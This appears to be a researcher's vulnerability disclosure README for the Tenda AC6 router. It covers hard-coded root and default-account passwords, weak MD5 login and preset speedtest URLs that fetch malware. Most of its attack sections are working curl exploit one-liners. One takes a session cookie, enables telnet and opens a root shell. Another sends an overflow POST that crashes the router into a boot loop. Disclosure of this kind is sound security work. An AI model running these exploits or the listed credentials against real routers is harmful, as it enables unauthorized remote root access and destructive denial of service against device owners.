<table>
<tr>
	<td colspan=2><b><h2 align=center>Equipment Overview
<tr>
	<td colspan=2 align=center>
		<center>
		<img height=150px align=center src="https://raw.githubusercontent.com/cecada/Tenda-AC6-Root-Acces/main/images/20200927_174832.jpg"> 
		<img height=150px align=center src="https://raw.githubusercontent.com/cecada/Tenda-AC6-Root-Acces/main/images/20200927_175341.jpg"> 
		<img height=150px align=center src="https://raw.githubusercontent.com/cecada/Tenda-AC6-Root-Acces/main/images/20201024_163850.jpg">
<tr>
	<td colspan=1> <b>Router: 
	<td colspan=1>Tenda AC1200 (Model AC6) Smart Dual Band WiFi Router
<tr>
	<td colspan=1><b>Firmware Version:
	<td colspan=1>V15.03.06.51_multi 
<tr>
	<td colspan=1><b>Linux Version:
	<td colspan=1>Linux linux-e06efcf50f50 3.10.90 #5 Thu Oct 8 17:04:23 CST 2020 mips GNU/Linux
<tr>
	<td colspan=1><b>GCC Version:
	<td colspan=1>4.4.7
<tr>
	<td colspan=1><b>Busybox Version:
	<td colspan=1>v1.19.2
<tr>
	<td colspan=1 width=25%><b>Busybox Functions:
	<td colspan=1>[, [[, adduser, arp, arping, ash, awk, brctl, cat, chmod, clear, cp, cttyhack, cut, date, deluser, depmod, echo,
        egrep, eject, env, expr, false, fdisk, fgrep, free, grep, halt, ifconfig, init, insmod, kill, killall, killall5,
        linuxrc, ln, login, ls, lsmod, mdev, mkdir, modinfo, modprobe, more, mount, mountpoint, mv, netstat, nslookup,
        passwd, ping, ping6, poweroff, printf, ps, pstree, pwd, reboot, reset, rm, rmdir, rmmod, route, runlevel, sed, sh,
        sleep, softlimit, split, sulogin, tar, telnet, telnetd, test, tftp, top, touch, traceroute, traceroute6, true, tty,
        umount, uname, unzip, uptime, usleep, vconfig, vi, wget, yes
<tr>
	<td colspan=1><b>Sys Type: 
	<td colspan=1>RTL8197F
<tr>
	<td colspan=1><b>Hardward Access: 
	<td colspan=1>SPI, UART
<tr>
	<td colspan=1><b>SPI Flash:
	<td colspan=1>25Q64JVSIQ (<a href="https://github.com/cecada/Tenda-AC6-Root-Acces/blob/main/docs/w25q64jv%20spi%20revc%2006032016%20kms.pdf">Spec Sheet</a>)
<tr>
	<td colspan=1><b>HTTP Admin Access: 
	<td colspan=1>192.168.0.1 (default) or 192.168.1.1
</table>

Found issues: 

* CVE-2020–10988 overview: root password is Fireitup, and static. This vulnerability persists to this model and version.
* HTTP admin access has a static username (admin)
* Admin password is only secured with a simple MD5 hash
* Default speed test settings located on mtdbblock5 point to urls which download malware:
  * speedtest.addr.list7=sh.vnet.cn/downloads/elive1.16.exe?0.4812286039814353 ([Hybrid Report](https://www.hybrid-analysis.com/sample/4c15a77c71218d7feef52d9c5504c0d32d8e580819186a4bb708d3c120e7b15e))
  * speedtest.addr.list6=viewer.d.cnki.net/CNKI%20E-Learning%202.4.1-20140714.exe ([Hybrid Report](https://www.hybrid-analysis.com/sample/bfa165373e5f5ed6ba4e73440bc9bb94d6089d8edb784db5a4a011d8ee87f790/5f8440c84e139b56f00f0728))
* (CVE-2020-28093) Default system accounts (admin, support, user, and nobody) are hidden from the HTTP admin console, have shell access, and all have 1234 as the password.
* It is possible to form an HTTP post will result in a denial of service by causing the router to crash and enter a boot loop.

<h2>Logging in / Getting Admin Password</h2>

Router admin is done via a web portal which is defaulted to 192.168.0.1. The only credentials which is asked for is the password. The username appears to be static admin. Prior to the HTTP POST request the client hashes the password using MD5. A sample curl would look like:

```
curl -isk -X 'POST' -H 'Host: 192.168.0.1' -H 'User-Agent: Mozilla/5.0' -H 'Accept: */*' 
-H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://192.168.0.1/login.html' 
-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest'
-H 'DNT: 1' -H 'Connection: close' --data-binary 'username=admin&password=2a3ffeeda250174eaeba880553e0dfd4'
--url 'http://192.168.0.1/login/Auth'
```
2a3ffeeda250174eaeba880553e0dfd4 = mathafter067

This results in 301 redirect to main.html, and of critical importance, a cookie is set with the hash + a pseudo-random 6 byte string. For example: 2a3ffeeda250174eaeba880553e0dfd4<b>piacvb</b> With this "token" we can do a lot of harm. 

Given the simplicity of authentication, the acceptance, and auto-population of default password, creating a brute-force script to find the password, and thus the MD5 hash is trivial.

Why is this a problem? I mean, if you have admin creds shouldn't you be able to turn on telnet? Perhaps. However, on this model the admin user interface does not have an interface for this. I have read some other model do. This seems to be an API access that wasn't intended for this model.

<h2>Turning on Telnet (CVE: CVE-2020-28093)</h2>
With this router, telnet is not on by default. I discovered a method, once you are connected and brute-forced the admin password you can turn it on without having to physically access the hardware. 

```
ahash=$(curl -isk -X 'POST' -H 'Host: 192.168.0.1' -H 'User-Agent: Mozilla/5.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' 
-H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://192.168.0.1/login.html' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' 
-H 'X-Requested-With: XMLHttpRequest' -H 'DNT: 1' -H 'Connection: close' --data-binary 'username=admin&password=2a3ffeeda250174eaeba880553e0dfd4' 
--url 'http://192.168.0.1/login/Auth'| grep Set-Cookie | cut -d\= -f2 | cut -d\; -f1); if [ -z "$ahash" ]; then echo -e "\n\nCouldn't get token? If you were logged in you are not logged out; try again. Else, check IP address."; else curl -isk -X 'GET' -H 'Host: 192.168.0.1' -H 'User-Agent: Mozilla/5.0' 
-H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://192.168.0.1/login.html' 
-H "Cookie: password=$ahash" -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'DNT: 1' 
-H 'Connection: close' --url 'http://192.168.0.1/goform/telnet'; echo -e "\n\nSuccess!"; telnet 192.168.0.1; fi
```
Because I am lazy, I created a "one-liner" which will:
* Grab the "token"
* Check for success
* Turn on telnet
* Launch telnet

Telnet will ask for the username/password which is root/Fireitup
Device R00ted with no access to the hardware needed

<h2>Denial of Service: Crash it (CVE-2020-28095)</h2>
Once you have brute forced the admin password it is possible to send an HTTP POST request which will trigger a crash, and result in a boot-loop.

```
overflow=$(perl -e 'print "A" x 1024');ahash=$(curl -isk -X 'POST' -H 'Host: 192.168.0.1' -H 'User-Agent: Mozilla/5.0' -H 'Accept: */*' 
-H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://192.168.0.1/login.html' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'DNT: 1' -H 'Connection: close' 
--data-binary 'username=admin&password=2a3ffeeda250174eaeba880553e0dfd4' --url 'http://192.168.0.1/login/Auth'| grep Set-Cookie | cut -d\= -f2 | cut -d\; -f1); 
if [ -z "$ahash" ]; then echo -e "\n\nCouldn't get token? If you were logged in you are not logged out; try again. Else, check IP address."; else curl -isk 
-X 'POST' -H 'Host: 192.168.0.1' -H 'User-Agent: Mozilla/5.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' 
-H 'Referer: http://192.168.0.1/wireless_ssid.html?random=0.54930120660236&' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' 
-H 'X-Requested-With: XMLHttpRequest' -H 'DNT: 1' -H 'Connection: close' -H “Cookie: password=$ahash” -H 'Sec-GPC: 1' -b "password=$ahash" 
--data-binary "wrlEn=1&wrlEn_5g=1&security=wpawpa2psk&security_5g=wpawpa2psk&ssid=Tenda_FC6EE0&ssid_5g=Tenda&hideSsid=0&hideSsid_5g=0&wrlPwd=$overflow&wrlPwd_5g=mathafter067" 
--url 'http://192.168.0.1/goform/WifiBasicSet';fi
```
Like the telnet vuln, I scripted this out. 
* Generate an overflow string
* Get login "token"
* Check if the login was a success or not
* If it was, post overflow string as a setting change to the wifi password

The router will crash, and only a physical hard factory reset will restore it. 

<table>
<tr>
	<td colspan=2 align=center>
		<center>
		<img height=400px align=center src="https://raw.githubusercontent.com/cecada/Tenda-AC6-Root-Acces/main/images/Screenshot_20201024_201441.png"> 
	<td colspan=2 align=center>
		<center>
		<img height=400px align=center src="https://raw.githubusercontent.com/cecada/Tenda-AC6-Root-Acces/main/images/Screenshot_20201024_201653.png"> 
</table>
